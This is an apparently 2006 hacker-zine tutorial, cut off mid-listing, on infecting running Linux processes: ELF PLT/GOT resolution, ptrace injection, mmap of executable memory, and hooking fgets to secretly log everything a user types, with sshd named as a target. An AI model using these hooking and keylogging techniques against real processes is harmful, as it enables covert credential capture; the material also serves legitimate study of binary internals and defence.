@@ -1,0 +1,1406 @@
+[ --- The Bug! Magazine
+
+                    _____ _              ___               _
+                   /__   \ |__   ___    / __\_   _  __ _  / \
+                     / /\/ '_ \ / _ \  /__\// | | |/ _` |/  /
+                    / /  | | | |  __/ / \/  \ |_| | (_| /\_/
+                    \/   |_| |_|\___| \_____/\__,_|\__, \/
+                                                   |___/
+
+                      [ M . A . G . A . Z . I . N . E ]
+
+
+             [ Numero 0x01 <---> Edicao 0x01 <---> Artigo 0x06 ]
+
+
+
+.> 23 de Marco de 2006,
+.> The Bug! Magazine < staff [at] thebugmagazine [dot] org >
+
+
+
+
+
+                    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+                      Complete guide to process infection
+		    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+
+.> 24 de Fevereiro de 2006,
+.> Carlos Barros a.k.a barros < barros [at] barrossecurity [dot] com >
+
+
+
+[ --- Table of Contents
+
++     1.              <-> Introduction
++     2.              <-> Symbol resolution
++       2.1.          <-> The PLT and GOT section
++     3.              <-> Injection steps
++       3.1.          <-> Determine what functions to hook
++       3.2.          <-> Write a shellcode for each function 
++         3.2.1.      <-> Calling the original function
++           3.2.1.1.  <-> If you hooked the PLT entry
++           3.2.1.2.  <-> If you hooked the GOT entry
++         3.2.2.      <-> Storing temporary data
++         3.2.3.      <-> Using shared library instead of assembly code
++       3.3.          <-> Locating functions' GOT and/or PLT entry
++         3.3.1.      <-> Using the program executable to locate the address
++           3.3.1.1.  <-> Locating a section within an ELF file
++           3.3.1.2.  <-> Locating the GOT address
++           3.3.1.3.  <-> Locating the PLT entry
++         3.3.2.      <-> Using the process memory to locate the address
++           3.3.2.1.  <-> Locating necessary sections
++           3.3.2.2.  <-> Locating the GOT entry
++           3.3.2.3.  <-> Locating the PLT entry
++       3.4.          <-> Inject your shellcode somewhere in the process memory
++       3.5.          <-> Patch functions' GOT and/or PLT entry
++         3.5.1.      <-> Patching the GOT entry
++         3.5.2.      <-> Patching the PLT entry
++     4.              <-> Executing code with ptrace
++     5.              <-> Putting all together
++       5.1.          <-> ptrace module
++       5.2.          <-> elf_file module
++       5.3.          <-> elf_ptrace module
++     6.              <-> References 
+
+
+
+[ --- 1. Introduction
+
+	In the past few weeks I've decided to code something about process
+infection and started googling on this topic. I've found some good papers and
+started my work. During my coding sessions I found out that there isn't any
+paper that suffices to code some real stuffs. Each paper lacks some 
+informations and some times this informations is not covered anywhere. I got 
+jammed in this situations many times and had to figure out somethings by 
+myself. This is way I've decided to write this article, to try to put together 
+everything that is need to write some real stuffs in process infection, 
+including all stuffs I developed by myself. In this paper I'll try to explain 
+in details all the steps need to infect a process, and at the end you will 
+find a library and a test case to illustrate all the theory of this paper.
+
+
+
+[ --- 2. Symbol resolution
+
+	The better way of injecting code into a process in order to make
+something useful is hooking external functions. To do this you will need to
+known how the binary locates and calls these functions. Here I'll give just a
+little introduction about this process, if you want more information on this, 
+take a look at [1].
+	We will use this code as our example for the rest of this section:
+
+--- snip ---
+
+	int main()
+	{
+		printf("Hello world\n");
+	}
+
+--- snip ---
+
+	Simple huh? Well, at first look yes, but, what happens from behind the
+scene? The printf function is located in the libc, so, when you compile this
+simple code, with gcc code.c -o code, this function is not located within the
+executable itself. You may be wondering, how can the compiler know the exactly
+address to direct the call to printf if it is not within the executable? The
+answer is simple: it doesn't know. The "magic" that makes this code to work is
+handled by two structures: Procedure Linkage Table (PLT) and Global Offset
+Table (GOT).
+
+
+
+[ --- 2.1. The PLT and GOT section
+
+	Remember that I said that the compiler does not know the address of
+printf function? So, gcc needs to direct that call to some place, and this
+place is the PLT section. Each function located outside the binary (in a .so
+for example) have an entry in this section. Lets take a look at the 
+disassemble of this call:
+
+	0x0804839c <main+24>:   call   0x80482b0 <_init+56>
+
+	This is our call to printf. As you can see, it doesn't call printf
+directly, instead, it call some address in the _init section (actually, it is
+the PLT section). Here is the disassemble of this address:
+
+	0x80482b0 <_init+56>:   jmp    *0x80495c8
+	0x80482b6 <_init+62>:   push   $0x8
+	0x80482bb <_init+67>:   jmp    0x8048290 <_init+24>
+
+	This is our good friend PLT Entry. That call to printf actually calls
+the first jmp instruction. As you can see, it gets the address to jump from
+the address 0x80495c8. This address is actually an entry in our other friend:
+the GOT section.
+	The GOT section is a table of absolute addresses that maps external 
+symbols into the process memory in order to keep the position-independence of 
+the code. Each external symbol has you own GOT entry that is filled by the 
+symbol resolution routine. On Linux systems (and others systems) the symbol 
+resolution is called as "Lazy Resolution". It means that the symbol is resolved 
+only when it is called for the very first time. 
+	So, in the first call to our printf function, its GOT entry will be 
+pointing to the next instruction following the first jmp (see above 
+disassemble). Here, the program pushes the offset that identifies the symbol it 
+is trying to access and jumps to the PLT0 entry, that is showed bellow.
+
+	0x8048290 <_init+24>:   pushl  0x80495bc
+	0x8048296 <_init+30>:   jmp    *0x80495c0
+
+	The PLT0 entry is a special entry that is responsible for calling the
+symbol resolution routine. This routines gets the symbol offset from the
+stack, determines what symbol to look for, locates it, store its real address 
+in the respective GOT entry (retrieved from the offset too) and finally calls 
+the original function. After that, the GOT entry will point to the real printf
+address, this way, on subsequents call, it is called directly, with no need of
+the PLT0 or the symbol resolution routine. Lets make a generic diagram of the 
+entire process of calling an external function, to illustrate all this steps 
+for a generic case;
+
+ Calling a function for the first time:
+
+                   ...
+   +-------------- call  function
+   |               ... <-------------------------------------------+
+   |                                                               |
+   |  +--> PLT0:   push  &(GOT+4)    +-------------------+    +----------+
+   |  |            call  *(GOT+8) -> | Symbol resolution | -> | function |
+   |  |                              +-------------------+    +----------+
+   |  |                                          +-----------+
+   +--+--> PLT1:   jmp   *(GOT+12) ------------> | GOT Entry |
+      |            push  offset_1 <------+       +-----------+
+      +----------- jmp   PLT0            |           |                  
+                   ...                   +-----------+                  
+
+ Calling a function for the second time:
+
+                   ...
+   +-------------- call  function
+   |               ... <--------------------------------------+
+   |                                                          |
+   |       PLT0:   push  &(GOT+4)                             |
+   |               call  *(GOT+8)                             |
+   |                                                          | 
+   |                                   +-----------+    +----------+
+   +-----> PLT1:   jmp   *(GOT+12) --> | GOT Entry | -> | function |
+                   push  offset_1      +-----------+    +----------+
+                   jmp   PLT0                                           
+                   ...                                                  
+
+	The PLT section described in this section is called Absolute Procedure 
+Linkage Table, but there's another type: Position-Independent Procedure Linkage 
+Table, that I'll not enter in details cause it does not change the way we use it
+to hook functions, as the only change is in the PLT0 entry.
+
+
+
+[ --- 3. Injection steps
+
+	Now that you know how an external function is called, lets examine the
+basic steps to infect a process:
+
+	1 - Determine what functions to hook;
+	2 - Write a shellcode for each function;
+	3 - Locate functions' GOT and/or PLT entry;
+	4 - Inject your shellcode somewhere in the process memory;
+	5 - Patch functions' GOT and/or PLT entry to point to your shellcode;
+	6 - Have fun!
+
+	I'll use the code bellow for the rest of this article to use as
+example. The testcase attached to this paper infect this code to log
+everything that is typed by the user.
+
+--- snip ---
+
+	#include <stdio.h>
+
+	int main()
+	{
+		char    buf[256];
+
+		while(fgets(buf,sizeof(buf),stdin))
+			printf("%s",buf);
+	}
+
+--- snip ---
+
+
+
+[ --- 3.1. Determine what functions to hook
+
+	This is the first step in the entire process of infection and as you
+can think, it is very simple. Wrong!!! The simplicity of this step is highly
+dependent of what program you are trying to infect. In our example it is very
+easy to determine the symbols, but imagine if you ar trying to infect a SSHd or
+something like this. At first you need to determine what you wanna do, then
+understand the source code, the flow of execution of the program and finally
+identify the functions. 
+	In our example we want to log everything the user typed, so, the best
+place to do this is in the fgets function. We will try to redirect it to our
+own code that will log to a file the text typed by the user.
+
+
+
+[ --- 3.2. Write a shellcode for each function
+
+	Ok, you have the list of function you will hook, now you need to write
+a shellcode for these functions. In general you'll need one shellcode for each
+function cause they are different in some aspects such as parameters and values
+returned. In our case we need just one cause we are hooking just one function,
+but it is not always like this, keep it in mind.
+	Before starting to write assembly code, read the "Function calling
+sequence" section in [4]. It describes some rules you have to follow when
+writing assembly functions such as registers you have to preserve. The most
+important thing you have to know is: never changes %ebx value inside a
+function (trust me, I had a bad experience with it).
+	In our target code, our shellcode will do the following:
+
+	1 - Call the original fgets function;
+	2 - Create some file in the system;
+	3 - Write in this file the value stored in buf;
+	4 - Return to the caller;
+
+	This is not a shellcode paper and I'll not give details in how to write 
+a shellcode, you can find good papers on this on the Internet, but there are
+some points that you must be aware of when writing hooks:
+
+	* Call the original hooke'd function;
+	* Find some place to store temporary data (if you need);
+
+
+
+[ --- 3.2.1. Calling the original function
+
+	When you write a hook to some function, generally you need to call the
+original function to get returned values or just to not disturb the normal
+behavior of a program. As you will see later in this paper, you can hook 
+functions using two techniques and each way of hooking has you own way of 
+calling the original function that will be described in the section.
+
+
+
+[ --- 3.2.1.1. If you hooked the PLT entry
+
+	When you hook the PLT entry of a function, the best way of calling the
+original function is backing up the original jmp instruction of the PLT before
+patching it and then inserting it in the appropriated place within your
+shellcode. One thing must be considered when doing this: do you need to get
+the control after you called the original function? If you don't need, you can
+just put the backup'd jmp instruction where you should place a ret
+instruction, this way you jmp the to original function and it do the work of
+returning to the caller.
+	But what if you need to get the control again, after the original
+function gets called? It is not a problem, you can write a wrapper around the
+jmp instruction to force it returning to you control again. Take a look at the
+following example:
+
+			call	jmp_to_function
+		our_control_again:
+			...
+
+		jmp_to_function:
+			jmp	*GOT_ENTRY
+
+	The call jmp_to_function will push into the stack the address of the
+next instruction and then our backup'd jmp will take place. The the original
+function executes the ret instruction, the flow will be transferred to
+out_control_again and you can do all you need before retuning to the caller.
+	If you use the second technique you must re-push all the parameters
+into the stack before jumping to the original function. It is necessary
+because you have another return address in the stack and it will shift the
+parameters.
+
+
+
+[ --- 3.2.1.2. If you hooked the GOT entry
+
+	When you hook the GOT entry, the best way of calling the original
+function is backing up the original address stored in the GOT entry before
+patching it and then inserting it in the appropriated place within your
+shellcode. Again you have to decide if you need to get the control of the 
+execution after the original function returns. If you don't need, you just 
+need to make a jmp to the original address:
+
+			mov	$ORIGINAL_ADDR,%eax
+			jmp	*%eax
+
+	If you need to get the control after the original function returns,
+you just need to change the jmp *%eax to a call *%eax and again, re-push all
+the parameter into the stack:
+
+			mov	$ORIGINAL_ADDR,%eax
+			call	*%eax
+
+	It seems simple but there's one more thing you must be aware of.
+Remember when I talked about the "Lazy Resolution"? So, if you hook one
+function before it was called for the first time, the original function
+address you will have will be the address of the second instruction of the
+function's PLT entry. The problem with this is that when you call the original
+function, you will be actually calling the symbol resolution routine, that
+will locate the symbol for you, call it and the, store the right address in
+the GOT entry, and here you will lose the game. As you can see, the address of
+your hook will be replaced and it will not be called anymore.
+	Here you have two options. The first one is, before returning the
+control to the caller (after calling the original function) you re-patch the
+GOT entry with the hook again. It is very simple, you just need to:
+
+			mov	$YOUR_HOOK_ADDRESS,%ecx
+			mov	%ecx,GOT_ENTRY
+			ret
+
+	Do not use the %eax or %ebx  register here if you need to return a 
+value, you will just get extra work.
+	Another option is to force the symbol to be resolved before you patch
+the GOT entry. This can be done by force the program to make a dummy call to
+the function you want to hook. In our example we need to make a dummy call to
+fgets function (we actually don't need cause fgets will be for sure resolved
+when we hook it, but just to illustrate the process). A dummy call to fgets can
+be something like this:
+
+			fgets(NULL,0,NULL);
+
+	or in assembly:
+
+			xor	%eax,%eax
+			push	%eax
+			push	%eax
+			push	%eax
+			mov	FGETS_GOT_ENTRY,%ebx
+			call	*%ebx
+
+	When you force the program to execute this instruction, you guarantee
+that fgets symbols is resolved before you hook it, thus, you don't need to
+care about it anymore.
+
+
+
+[ --- 3.2.2. Storing temporary data
+
+	Depending on what you are doing in your hooking routine, you will need
+to store temporary that you will use some time later in the shellcode. A good
+example of this is when you hook a function that returns a function pointer
+and you need to hook that pointer too. You will need to store this pointer
+somewhere in the memory and return a fake one to the caller. When this new
+hook is called, you need to call the original function, so you need to get it
+from the memory (a bit confusing huh?).
+	One way of doing this is forcing the process to allocate some memory
+for you and then hardcode this address in you shellcode (patching the
+shellcode). This is a good way but there's another method that I find out.
+	As you will see when I talk about injecting the shellcode, you code
+will be stored in a writable section of the process memory. Taking advantage of
+this, you can leave some extra space anywhere in you shellcode to store
+temporary data. This way you don't need to care about what address your data
+will be placed, you can determine it at run-time. Following is a example of
+this technique:
+
+	shellcode:
+			...
+			call	temp_data	
+			pop	%ecx		; %ecx contains the base
+			...			; address of the storage
+			...			; space
+			ret
+	temp_data:
+			pop	%edx
+			call	*%edx
+			.dword	0x00000000	; 8 bytes of
+			.dword	0x00000000	; temporary storage
+
+	Every time you need to use your temporary storage space, you call
+temp_data and then pop the address in the stack to some register. This
+register will contain the base address of you storage space. Simple huh?
+
+
+
+[ --- 3.2.3. Using shared library instead of assembly code
+
+	In [2], an Anonymous author demonstrated one way of injecting a
+shared library in some process. The major advantage of this technique is
+that you can write you hooks in pure C code. The disadvantage of this is that
+you load a new library in the process, thus leaving traces in the process
+memory map. If you want details about this technique you can read [2].
+
+
+
+[ --- 3.3. Locating functions' GOT and/or PLT entry
+
+	Up to here we know what functions we will hook and how to write the
+shellcode, but we still need one more information: where are the GOT/PLT entry 
+of our functions located? This is the most important step in the infection 
+process and probably the most complex too. Here we have to choose what will be 
+the approach used to hook our functions: GOT entry hook or PLT entry hook.
+	You have two ways of searching for these address, using the executable
+file itself to navigate through the sections or attaching to the process and
+navigating through the process memory.
+
+
+
+[ --- 3.3.1. Using the program executable to locate the address
+
+	To search for the GOT/PLT entry in a executable file, we will need to
+locate some sections within it. So, before starting our search, I need to
+explain how to locate a section in and ELF file. It is not an elf tutorial,
+so if you want to know more about this, read [5].
+
+
+
+[ --- 3.3.1.1. Locating a section within an ELF file
+
+	Before everything lets take a look in the elf's main header that is
+located in the offset 0 of the file:
+
+	typedef struct
+	{
+	  unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */
+	  Elf32_Half    e_type;         /* Object file type */
+	  Elf32_Half    e_machine;      /* Architecture */
+	  Elf32_Word    e_version;      /* Object file version */
+	  Elf32_Addr    e_entry;        /* Entry point virtual address */
+	  Elf32_Off     e_phoff;        /* Program header table file offset */
+	  Elf32_Off     e_shoff;        /* Section header table file offset */
+	  Elf32_Word    e_flags;        /* Processor-specific flags */
+	  Elf32_Half    e_ehsize;       /* ELF header size in bytes */
+	  Elf32_Half    e_phentsize;    /* Program header table entry size */
+	  Elf32_Half    e_phnum;        /* Program header table entry count */
+	  Elf32_Half    e_shentsize;    /* Section header table entry size */
+	  Elf32_Half    e_shnum;        /* Section header table entry count */
+	  Elf32_Half    e_shstrndx;     /* Section header string table index */	
+	} Elf32_Ehdr;
+
+	There are three fields in this structure that is necessary to us:
+e_shoff, e_shnum and e_shstrndx. e_shoff give us the offset of the first
+section header in the sections header table. e_shnum gives the number of
+entries in the sections header table, and finally, the e_shstrndx gives the
+index in the sections header table of the section header string table, that
+contains the names of all sections. Each section has the following structure:
+
+	typedef struct
+	{
+	  Elf32_Word    sh_name;        /* Section name (string tbl index) */
+	  Elf32_Word    sh_type;        /* Section type */
+	  Elf32_Word    sh_flags;       /* Section flags */
+	  Elf32_Addr    sh_addr;        /* Section virtual addr at execution */
+	  Elf32_Off     sh_offset;      /* Section file offset */
+	  Elf32_Word    sh_size;        /* Section size in bytes */
+	  Elf32_Word    sh_link;        /* Link to another section */
+	  Elf32_Word    sh_info;        /* Additional section information */
+	  Elf32_Word    sh_addralign;   /* Section alignment */
+	  Elf32_Word    sh_entsize;     /* Entry size if section holds table */
+	} Elf32_Shdr;   
+  
+	The important fields for us in this structure is sh_name and
+sh_offset. sh_name is an index for the name of the section in the Section
+header string table, and sh_offset is the offset of the section within the
+executable file.
+	Know that we know the necessary structures, the following pseudo-code 
+illustrate the steps to locate any section in the ELF file:
+
+	sh_header <- e_shoff;
+	str_table <- sh_header[e_shstrndx].sh_offset
+	for I = 0 to Elf32_Ehdr.e_shnum do
+	begin
+		if str_table[sh_header[I].sh_name] == "desired_section" then
+			found_section <- &sh_header[I];
+	end;
+
+	This will return a pointer to the desired_section's header.
+
+
+
+[ --- 3.3.1.2. Locating the GOT address
+
+	Using the executable itself to locate the GOT entry of a symbol is the
+easier and most reliable way of doing that. In the ELF file, there's a special 
+section called .rel.plt section. Following is the struct that represents each 
+entry in this section, from elf.h.
+
+	typedef struct
+	{
+		Elf32_Addr    r_offset; /* Address */
+		Elf32_Word    r_info;   /* Relocation type and symbol index */
+	} Elf32_Rel;
+
+	The r_offset field points to the GOT entry of the related symbol and
+r_info contains some informations about the symbol. Among other infos, r_info
+contains the symbol index in the .dynsym section. This index can be retrieved
+using the following macro, defined in elf.h:
+
+	#define ELF32_R_SYM(val)                ((val) >> 8)
+
+	The .dynsym section contains some more informations about each
+relocatable symbol in the file. Each entry is represented by this struct:
+
+	typedef struct  
+	{ 
+		Elf32_Word    st_name;   /* Symbol name (string tbl index) */
+		Elf32_Addr    st_value;  /* Symbol value */
+		Elf32_Word    st_size;   /* Symbol size */
+		unsigned char st_info;   /* Symbol type and binding */
+		unsigned char st_other;  /* Symbol visibility */
+		Elf32_Section st_shndx;  /* Section index */
+	} Elf32_Sym;
+
+	The important field for us here is the st_name. This field is the
+index for the symbol's name within the .dynstr section. The .dynstr section is
+a string table, just like the section header string table, where all symbols 
+name is stored. .dynstr[st_name] points to the symbol's name string.
+	Ok, now we have all the informations we need to locate the GOT address
+for any symbol inside the executable, so, the following pseudo-code illustrate
+how to locate one symbol's GOT entry: 
+
+	rel_plt_header <- locate_section(".rel.plt");
+	rel_plt <- rel_plt_header.sh_offset;
+	symcount <- rel_plt_header.sh_size / rel_plt_header.sh_entsize;
+	dynstr <- locate_section(".dynstr").sh_offset;
+	dynsym <- locate_section(".dynsym").sh_offset;
+
+	for I = 0 to symcount do
+	begin
+		if dynstr[sym[ELF32_R_SYM(rel_plt[I].r_info)].st_name] == \
+		   "desired_symbol" then
+			found_got <- rel_plt[I].r_offset;
+	end;
+
+
+
+[ --- 3.3.1.3. Locating the PLT entry
+
+	Locating the PLT entry is similar to locating the GOT entry. We travel
+through the .rel_plt section and locate the entry index related to our symbol.
+Using this index we can calculate the offset of the PLT entry in the .plt
+section.
+	Each entry in the .plt section has 16 bytes long and as I showed
+before, the first entry (PLT0) is not related to any symbol. So, to calculate
+the the offset in the .plt section we do:
+
+	address = .plt_address + (symindex + 1) * 16;
+
+	The following pseudo-code illustrate the entire process:
+
+        rel_plt_header <- locate_section(".rel.plt");
+        rel_plt <- rel_plt_header.sh_offset;
+        symcount <- rel_plt_header.sh_size / rel_plt_header.sh_entsize;
+        dynstr <- locate_section(".dynstr").sh_offset;
+        dynsym <- locate_section(".dynsym").sh_offset;
+
+        for I = 0 to symcount do
+        begin
+                if dynstr[sym[ELF32_R_SYM(rel_plt[I].r_info)].st_name] == \
+                   "desired_symbol" then
+			symindex <- I;
+        end;
+
+	found_plt <-  locate_section(".plt").sh_addr + (symindex + 1) * 16;
+
+
+
+[ --- 3.3.2. Using the process memory to locate the address
+
+	Locating the necessary address navigating through the process memory
+is not that easy as using the executable file, but it is possible. This
+technique is based on the technique presented in [2], with some major 
+modifications.
+
+
+
+[ --- 3.3.2.1. Locating necessary sections
+
+	Again, before we start we will need to locate some sections in the
+process. Here, we cannot navigate through the sections headers of the process
+cause it is not mapped in the process memory, but we have another way: we can
+use the program headers. We can locate the program header table using the the
+elf's main header (by the e_phoff field) that can be located at address 
+0x08048000 in the process memory (at least on Linux boxes). Lets take a look 
+on what a program header looks like:
+
+	typedef struct
+	{
+	  Elf32_Word    p_type;       /* Segment type */
+	  Elf32_Off     p_offset;     /* Segment file offset */
+	  Elf32_Addr    p_vaddr;      /* Segment virtual address */
+	  Elf32_Addr    p_paddr;      /* Segment physical address */
+	  Elf32_Word    p_filesz;     /* Segment size in file */
+	  Elf32_Word    p_memsz;      /* Segment size in memory */
+	  Elf32_Word    p_flags;      /* Segment flags */
+	  Elf32_Word    p_align;      /* Segment alignment */
+	} Elf32_Phdr;
+
+
+	We have to traverse the program header table until we find a program
+header with e_type = PT_DYNAMIC. The PT_DYNAMIC gives us the address of the
+.dynamic sections, that contains the address of all dynamic section in the
+process memory. Each entry in the .dynamic section has the following
+structure:
+
+	typedef struct  
+	{ 
+		  Elf32_Sword   d_tag;           /* Dynamic entry type */
+		  union
+		    {
+			      Elf32_Word d_val;  /* Integer value */
+			      Elf32_Addr d_ptr;  /* Address value */
+		    } d_un;
+	} Elf32_Dyn;
+
+	If we traverse through the .dynamic sections we will found six
+interesting entries, identified by the d_tag field:
+
+	* DT_PLTGOT	- d_un.d_ptr will point to the .got.plt section;
+	* DT_JMPREL	- d_un.d_ptr will point to the .rel.plt section;
+	* DT_PLTRELSZ	- d_un.d_val will give the size in bytes of .rel.plt
+			  section;
+	* DT_INIT	- d_un.d_ptr will point to the .init section;
+	* DT_SYMTAB	- d_un.d_ptr will point to the .dynsym section;
+	* DT_STRTAB	- d_un.d_ptr will point to the .dynstr section;
+
+	At this point we have all section address we need to start scanning
+for the GOT/PLT entries.
+
+
+
+[ --- 3.3.2.2. Locating the GOT entry
+
+	Locating the GOT entry in the process memory is the same as locating
+in the elf file itself. You traverse the .got.plt section, get the .dynsym
+symbols' index, compare the name in the .dynstr and if it matches, you get the
+GOT entry in the r_offset field of the .got.plt entry. The only difference here
+is that you are not reading an file, but a process memory via ptrace.
+
+
+
+[ --- 3.3.2.3. Locating the PLT entry
+
+	Well, here things is a bit different, but don't be afraid, it won't
+hurt. As you could notice, we don't know here the address of the .plt section
+as we know when playing with the binary, so we have to find another way to
+locate the PLT entry. If you look in the beginning of this article, you can see
+that for each PLT entry (except the PLT0) you have a jmp *GOT_ENTRY, and this
+is our chance. Lets disassemble the PLT entry of our target program's printf:
+
+	80482b0:       ff 25 c0 95 04 08       jmp    *0x80495c0
+
+	Hmm, looks interesting... We have the address of the GOT entry in the
+opcodes. As shown in the above section, it is easy to determine the GOT entry 
+of a symbol, so what we have to do is locate the GOT entry of our
+symbol, then, starting from the .init section, search for this GOT entry
+pattern. When we found it, this_addr - 2 will point exactly in the PLT entry
+of the symbol. The following pseudo-code illustrates this process:
+
+	got_entry <- locate_got("our_symbol");
+	search_addr <- init_addr;
+	while true
+	begin
+		pattern <- (int)*search_addr;
+		if pattern == got_entry then
+			break;
+		pattern = pattern + 1;
+	end;
+	found_plt <- search_addr - 2;
+
+
+
+[ --- 3.4. Inject your shellcode somewhere in the process memory
+
+	Know that you have all the address you need and the shellcode you
+should be asking: where in the process memory will I put the shellcode? This
+question has more than one answer. You can find some safe place in the stack
+and put the shellcode there, but there's a drawback that if the stack is not
+executable, you loose the game. In [3], Ares showed that you can overwrite
+the program headers, located in the process image and put your code there, but
+the size is limited in a few hundred bytes, and you cannot use the technique
+I explained to store temporary data. Again in [3], Ares demonstrated that is 
+possible to force the process mmap some anonymous memory space in its address 
+space so we can use it, and this is the technique I'll talk about in this 
+section. At first, lets look how we do mmap an anonymous memory:
+
+	mmap(NULL,length,PROT_READ|PROT_WRITE|PROT_EXEC, \
+		MAP_PRIVATE|MAP_ANONYMOUS,-1,0)
+
+	As you can see we set this new memory region as "executable", this way
+we skip any stack/heap protection scheme. To force a process to execute this
+mmap call we need to convert it to a shellcode and then inject the shellcode
+in the process. To convert it to a shellcode we need to disassemble this
+function call:
+
+		0x08048213 <main+31>:   push   $0x0		// offset
+		0x08048215 <main+33>:   push   $0xffffffff	// fd
+		0x08048217 <main+35>:   push   $0x22		// flags
+		0x08048219 <main+37>:   push   $0x7		// prot
+		0x0804821b <main+39>:   push   $0x41414141	// length
+		0x08048220 <main+44>:   push   $0x0		// start
+		0x08048222 <main+46>:   call   0x804ed50 <mmap>
+		...
+		...
+		0x0804ed50 <mmap+0>:    mov    %ebx,%edx
+		0x0804ed52 <mmap+2>:    mov    $0x5a,%eax
+		0x0804ed57 <mmap+7>:    lea    0x4(%esp),%ebx
+		0x0804ed5b <mmap+11>:   int    $0x80
+		0x0804ed5d <mmap+13>:   mov    %edx,%ebx
+		0x0804ed5f <mmap+15>:   cmp    $0xfffff000,%eax
+		0x0804ed64 <mmap+20>:   ja     0x8050a90 <__syscall_error>
+		0x0804ed6a <mmap+26>:   ret    
+
+	The mmap system call is identified by the code 0x5a of the int $0x80
+and expect a single param, via %ebx register, that is a pointer to all of its
+parameters. In our shellcode, the parameter, except length, will be fixed, so
+we can hardcode all the param in the shellcode itself, and pass this address
+via %ebx to the mmap syscall. About the length, we can hardcode some
+placeholder value and before injecting the shellcode in the process memory,
+patch it with the real value. Rewriting the assembly code we get this:
+
+		mmap:		mov	%0x5a,%eax
+				jmp	mmap_params
+		mmap1:		pop	%ebx
+				int	$0x80
+
+		mmap_params:	call	mmap1
+				.dword	0x00000000	// start
+				.dword	0x41414141	// length
+				.dword	0x07000000	// prot
+				.dword	0x22000000	// flags
+				.dword	0xffffffff	// fd
+				.dword	0x00000000	// offset
+
+	Quite simple huh? Now you just need to inject this shellcode in the
+process memory, force it to execute and then get the mmapd address via %eax
+register and inject you shellcode into this address. Later we will see how to 
+force a process to execute your code.
+
+
+
+[ --- 3.5. Patch functions' GOT and/or PLT entry
+
+	Finally the last step to infect a process. Up to here you've gotten 
+all addresses and injected you shellcode into the process memory, now the last
+step is patch the GOT/PLT entry to redirect the original function call to your
+shellcode.
+
+
+
+[ --- 3.5.1. Patching the GOT entry
+
+	Patching the GOT entry is a very easy task. The GOT entry is just a
+pointer to the real function, so, what have you to do? Just overwrite this
+pointer with a pointer to you shellcode. But don't forget to backup the
+original pointer before you patch it, as I said in the section about writing
+the shellcode.
+
+
+
+[ --- 3.5.2. Patching the PLT entry
+
+	PLT is not that simple, but it is not that hard too. The PLT entry
+contains a jmp *GOT_ENTRY instruction so we can overwrite this instruction 
+with any other instruction (or instructions) to jump to your shellcode. Again, 
+take a look in this jump disassemble:
+
+        80482b0:       ff 25 c0 95 04 08       jmp    *0x80495c0
+
+	You have six bytes to play with. As you should know, the better way 
+to make a jmp code is using the push and ret combination, so you can do a 
+absolute jump anywhere you want.
+
+	jmpcode:	push	$SHELLCODE_ADDR
+			ret
+
+	Lets look the opcodes generated by this instructions:
+
+		0:   68 41 41 41 41          push   $0x41414141
+		5:   c3                      ret    
+
+	Woow. It is exactly six bytes long. So, know you just need to patch
+this jmpcode to change the 0x41414141 with the shellcode's address and
+overwrite the original jmp to you jmpcode, in the PLT entry. Again, remember
+to backup the original jmp, you may need it in you shellcode.
+
+
+
+[ --- 4. Executing code with ptrace
+
+	In this entire article, you could notice that I mentioned a few time
+something about force a process to execute some code for you, but don't
+explained how we are supposed to do that. Ok, here we go!
+	When you attach to a process, it stops and keep waiting for command
+that you can send via ptrace system call (read the ptrace man pages for more
+informations). At this point we have full control over the process. To force
+the process to execute some code for us, we need to inject the code in the
+process, set the %eip to that location and then send a command to the process 
+to it continue the execution. Again we need to find a place to put our code, 
+but this time we don't need to care with this. What we have to do here is:
+
+	1 - Get the %eip address via the PTRACE_GETREGS;
+	2 - Calculate the size of our shellcode;
+	3 - Backup size bytes from the %eip address and on, in the process
+	    memory, using the PTRACE_PEEKTEXT;
+	4 - Write our shellcode in the %eip address, using the
+	    PTRACE_POKETEXT;
+	5 - Send a command the the process to continue execution;
+	6 - Wait till the process stops;
+	7 - Restore the memory overwritten;
+	8 - Restore the registers via PTRACE_SETREGS;
+
+	In order to utilize this technique, the shellcode must be written in
+a such way that the process will stop in the end of it. One way of doing it is
+putting an int3 instruction, that generates one break-point and stop the
+process again. 
+	Sometimes when you issue the continue command, you get jammed. This
+happens when the target application is in the blocked state waiting for some
+IO operations such as some keyboard input or data from a socket. In this case,
+you can simply interact with the target program (hitting ENTER, connecting to
+the application network port, something like this) and everything will work
+just fine. In our test case we need to hit enter in the target program to get
+it working, you will see it by yourself.
+
+
+
+[ --- 5. Putting all together
+
+	Ok ok, that's enough of theory. In this paper my focus was not in
+showing source codes that DO the work, but explaining HOW these codes should
+work. But of course, I've coded something to demonstrate all the theory of
+this article. I called it a libinfector and is attached to this article. This
+library is composed of three main modules: ptrace module, elf_file module and
+elf_ptrace module. With the library, there's a test case composed of one
+target application (the same used in the article) and two infectors, one
+utilizing the elf file and other the process memory to locate symbols.
+
+
+
+[ --- 5.1. ptrace module
+
+	The ptrace module contains functions responsible to attaching to a 
+process, reading data, writing data, allocating memory via mmap technique 
+and execute your supplied code. The interface is composed by 8 functions:
+
+	void ptrace_attach(int pid): 
+	  this function attach to the process identified by pid;
+
+	void ptrace_cont(int pid): 
+	  send the command to the process (pid) to  continue the execution;
+
+	void ptrace_detach(int): detach from the process identified by pid; 
+
+	void ptrace_read_data(int pid, int addr, void *vptr, int len): 
+	  read len bytes from addr, in the process identified by pid, and
+	  store the data in vptr;
+
+	void ptrace_write_data(int pid,int addr, void *vptr, int len):
+	  writes len bytes of vptr in addr of the process identified by pid;
+
+	char *ptrace_read_str(int pid, int addr, int len):
+	  read a string of maximum len bytes from addr in the process
+	  identified by pid;
+
+	int ptrace_mmap(int pid, int len):
+	  allocate len bytes in the process identified by pid using the mmap
+	  technique;
+
+	int ptrace_execute_code(int pid, void *code, int len):
+	  force the process identified by pid to execute code, using the
+	  technique described in this article;
+
+
+
+[ --- 5.2. elf_file module
+
+	The elf_file module contains functions that is used to open and elf
+file and locate PLT and GOT entries of symbols. The API if composed by 5
+functions:
+
+	elf_file_struct *elf_file_new(char *filename):
+	  open filename, create and elf_file_struct filled with the necessary
+	  values and return it;
+
+	Elf32_Shdr *elf_file_locate_section(elf_file_struct *elf, \ 
+		char *section_name):
+	  locates the section_name within the binary described in the elf
+	  structure;
+
+	int elf_file_find_symbol_index(elf_file_struct *elf, \
+		char *symbol_name):
+	  get the index of the symbol_name in the .got.plt section of elf;
+
+	int elf_file_find_symbol_got(elf_file_struct *elf, char *symbol_name):
